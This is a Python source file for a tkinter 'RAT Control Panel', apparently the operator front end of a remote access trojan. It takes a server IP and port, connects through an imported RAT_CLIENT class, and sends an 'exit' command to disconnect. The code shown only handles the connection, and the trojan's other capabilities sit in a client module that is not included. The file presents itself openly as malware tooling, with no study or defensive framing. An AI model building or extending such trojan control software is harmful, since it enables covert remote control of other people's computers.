import tkinter as tk
from tkinter import messagebox
from client.pyw import RAT_CLIENT


class RATInterface:
    def __init__(self, root):
        self.root = root
        self.root.title("RAT Control Panel")
        
        # Create buttons
        self.connect_button = tk.Button(root, text="Connect", command=self.connect_to_server)
        self.connect_button.pack()

        self.disconnect_button = tk.Button(root, text="Disconnect", command=self.disconnect_from_server)
        self.disconnect_button.pack()

        # Create entry for IP and port
        self.ip_label = tk.Label(root, text="Server IP:")
        self.ip_label.pack()
        self.ip_entry = tk.Entry(root)
        self.ip_entry.pack()

        self.port_label = tk.Label(root, text="Port:")
        self.port_label.pack()
        self.port_entry = tk.Entry(root)
        self.port_entry.pack()

    def connect_to_server(self):
        ip = self.ip_entry.get()
        port = int(self.port_entry.get())
        try:
            self.rat_client = RAT_CLIENT(ip, port)
            self.rat_client.build_connection()
            messagebox.showinfo("Success", "Connected to server successfully!")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to connect: {str(e)}")

    def disconnect_from_server(self):
        try:
            self.rat_client.s.send(b"exit")
            self.rat_client.s.close()
            messagebox.showinfo("Success", "Disconnected from server!")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to disconnect: {str(e)}")

def main():
    root = tk.Tk()
    app = RATInterface(root)
    root.mainloop()

if __name__ == "__main__":
    main()
